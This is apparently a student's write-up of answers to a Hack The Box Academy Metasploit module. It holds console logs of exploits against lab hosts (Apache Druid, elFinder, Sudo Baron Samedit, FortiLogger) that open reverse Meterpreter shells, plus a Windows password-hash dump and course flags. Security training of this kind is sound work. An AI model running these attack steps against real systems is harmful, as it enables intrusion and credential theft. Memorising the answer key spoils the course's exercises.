# Using the Metasploit Framework
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Using the Metasploit Framework
* Tier: 0
* Difficulty: Easy
* Category: Offensive
* Time estimate: 5 hours
* Date: 14-11-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Introduction to Metasploit
### Question 1:
![](./attachments/Pasted%20image%2020221112121343.png)

**Answer:** `Metasploit Pro`

### Question 2:
![](./attachments/Pasted%20image%2020221112121356.png)

**Answer:** `msfconsole`

---
## Modules
### Question:
![](./attachments/Pasted%20image%2020221112121630.png)

**Answer:** `HTB{MSF-W1nD0w5-3xPL01t4t10n}`

---
## Payloads
### Question:
![](./attachments/Pasted%20image%2020221113104049.png)
*Hint: We can search in MSF for multiple words.*

```
msf6 > search druid

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/linux/http/apache_druid_js_rce    2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
   1  auxiliary/spoof/dns/bailiwicked_domain    2008-07-21       normal     Yes    DNS BailiWicked Domain Attack
   2  auxiliary/spoof/dns/bailiwicked_host      2008-07-21       normal     Yes    DNS BailiWicked Host Attack
   3  auxiliary/scanner/http/log4shell_scanner  2021-12-09       normal     No     Log4Shell HTTP Scanner
   4  exploit/solaris/sunrpc/ypupdated_exec     1994-12-12       excellent  No     Solaris ypupdated Command Execution
   5  exploit/dialup/multi/login/manyargs       2001-12-12       good       No     System V Derived /bin/login Extraneous Arguments Buffer Overflow
   6  auxiliary/scanner/telephony/wardial                        normal     No     Wardialer


Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/telephony/wardial

msf6 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_druid_js_rce) > options

Module options (exploit/linux/http/apache_druid_js_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8888             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.
                                         0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of Apache Druid
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (dropper)


msf6 exploit(linux/http/apache_druid_js_rce) > set RHOST 10.129.203.52
RHOST => 10.129.203.52
msf6 exploit(linux/http/apache_druid_js_rce) > set LHOST 10.10.14.195
LHOST => 10.10.14.195
msf6 exploit(linux/http/apache_druid_js_rce) > run

[*] Started reverse TCP handler on 10.10.14.195:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://10.10.14.195:8080/jj46JOXp1NADcwg
[*] Client 10.129.203.52 (curl/7.68.0) requested /jj46JOXp1NADcwg
[*] Sending payload to 10.129.203.52 (curl/7.68.0)
[*] Sending stage (3045348 bytes) to 10.129.203.52
[*] Meterpreter session 1 opened (10.10.14.195:4444 -> 10.129.203.52:50392) at 2022-11-13 05:08:12 -0500
[*] Command Stager progress - 100.00% done (120/120 bytes)
[*] Server stopped.

meterpreter > shell
Process 2677 created.
Channel 1 created.
cat /root/flag.txt
HTB{MSF_Expl01t4t10n}
```

**Answer:** `HTB{MSF_Expl01t4t10n}`

---
## Sessions
### Question:
![](./attachments/Pasted%20image%2020221113120602.png)

![](./attachments/Pasted%20image%2020221113120711.png)

Alternate:

```
┌──(kali㉿kali)-[~]
└─$ sudo curl 10.129.113.119            
[sudo] password for kali: 
<!DOCTYPE html>
<html>
        <head>
                <meta charset="utf-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
                <title>elFinder 2.1.x source version with PHP connector</title>
(...)
```

**Answer:** `elFinder`

### Question:
![](./attachments/Pasted%20image%2020221113120613.png)

```
msf6 > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf6 > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0
                                         .0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.14.195
LHOST => 10.10.14.195
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOST 10.129.203.52
RHOST => 10.129.203.52
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run

[*] Started reverse TCP handler on 10.10.14.195:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file eEvfV.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive HGTqDZOa.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.14.195:8080/YjV8jaCgrGVTwe
[*] Client 10.129.203.52 (Wget/1.20.3 (linux-gnu)) requested /YjV8jaCgrGVTwe
[*] Sending payload to 10.129.203.52 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  53.45% done (62/116 bytes)
[*] Command Stager progress -  72.41% done (84/116 bytes)
[*] Sending stage (1017704 bytes) to 10.129.203.52
[+] Deleted eEvfV.txt
[+] Deleted HGTqDZOa.zip
[*] Meterpreter session 1 opened (10.10.14.195:4444 -> 10.129.203.52:54874) at 2022-11-14 04:05:24 -0500
[*] Command Stager progress -  83.62% done (97/116 bytes)
[*] Command Stager progress - 100.00% done (116/116 bytes)
[*] Server stopped.

meterpreter > shell
Process 1220 created.
Channel 1 created.
whoami
www-data
```

**Answer:** `www-data`

### Question:
![](./attachments/Pasted%20image%2020221113120622.png)

```
(...)
sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
Background channel 1? [y/N]  y
meterpreter > 
Background session 1? [y/N]  y
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > search sudo 1.8.31

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/linux/local/sudo_baron_samedit  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/sudo_baron_samedit

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > use 0
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/sudo_baron_samedit) > options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
msf6 exploit(linux/local/sudo_baron_samedit) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter x86/linux  www-data @ 10.129.203.52  10.10.14.195:4444 -> 10.129.203.52:54874 (10.129.203.52)

msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
session => 1
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST 10.10.14.195


msf6 exploit(linux/local/sudo_baron_samedit) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Started reverse TCP handler on 10.10.14.195:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/XkHxg.py' (763 bytes) ...
[*] Writing '/tmp/libnss_m5dVn/y .so.2' (548 bytes) ...
[*] Sending stage (3045348 bytes) to 10.129.203.52
[+] Deleted /tmp/XkHxg.py
[+] Deleted /tmp/libnss_m5dVn/y .so.2
[+] Deleted /tmp/libnss_m5dVn
[*] Meterpreter session 2 opened (10.10.14.195:4444 -> 10.129.203.52:54968) at 2022-11-14 04:12:47 -0500

meterpreter > shell
Process 1542 created.
Channel 1 created.
cat /root/flag.txt
HTB{5e55ion5_4r3_sw33t}
```

**Answer:** `HTB{5e55ion5_4r3_sw33t}`

---
## Meterpreter
### Question 1:
![](./attachments/Pasted%20image%2020221114105411.png)

```
msf6 > nmap -sV -sC -T 4 10.129.203.65
[*] exec: nmap -sV -sC -T 4 10.129.203.65

Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-14 04:49 EST
Nmap scan report for 10.129.203.65
Host is up (0.071s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-14T09:49:43+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-51BJ97BCIPV
|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
|   DNS_Domain_Name: WIN-51BJ97BCIPV
|   DNS_Computer_Name: WIN-51BJ97BCIPV
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-14T09:49:36+00:00
| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
| Not valid before: 2022-11-13T09:41:17
|_Not valid after:  2023-05-15T09:41:17
5000/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: FortiLogger | Log and Report System
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-14T09:49:37
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.50 seconds
msf6 > search fortilogger

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload

msf6 > use 0

msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > options

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.203.65    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger < 5.2.0


msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOST 10.129.203.65
RHOST => 10.129.203.65
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > run

[*] Started reverse TCP handler on 10.10.14.195:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (175686 bytes) to 10.129.203.65
[*] Meterpreter session 3 opened (10.10.14.195:4444 -> 10.129.203.65:49697) at 2022-11-14 04:53:17 -0500

meterpreter > shell
Process 6332 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

**Answer:** `nt authority\system`

### Question 2:
![](./attachments/Pasted%20image%2020221114105449.png)

```
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY c897d22c1c56490b453e326f86b2eef8...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[-] Error: ArgumentError wrong number of arguments (given 4, expected 5) ["/usr/share/metasploit-framework/lib/msf/util/windows_crypto_helpers.rb:144:in `decrypt_user_hash'", "(eval):162:in `block in decrypt_user_keys'", "(eval):146:in `each_key'", "(eval):146:in `decrypt_user_keys'", "(eval):260:in `run'", "/usr/share/metasploit-framework/lib/rex/script/base.rb:44:in `eval'", "/usr/share/metasploit-framework/lib/rex/script/base.rb:44:in `run'", "/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:318:in `execute_file'", "/usr/share/metasploit-framework/lib/msf/base/sessions/scriptable.rb:183:in `execute_script'", "/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1502:in `cmd_run'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'", "/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'", "/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:157:in `run'", "/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'", "/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'", "/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:192:in `cmd_exploit'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "/usr/bin/msfconsole:23:in `<main>'"]
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY c897d22c1c56490b453e326f86b2eef8...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

**Answer:** `cf3a5525ee9414229e66279623ed5c58`

---
**Tags:** [[Hack The Box Academy]]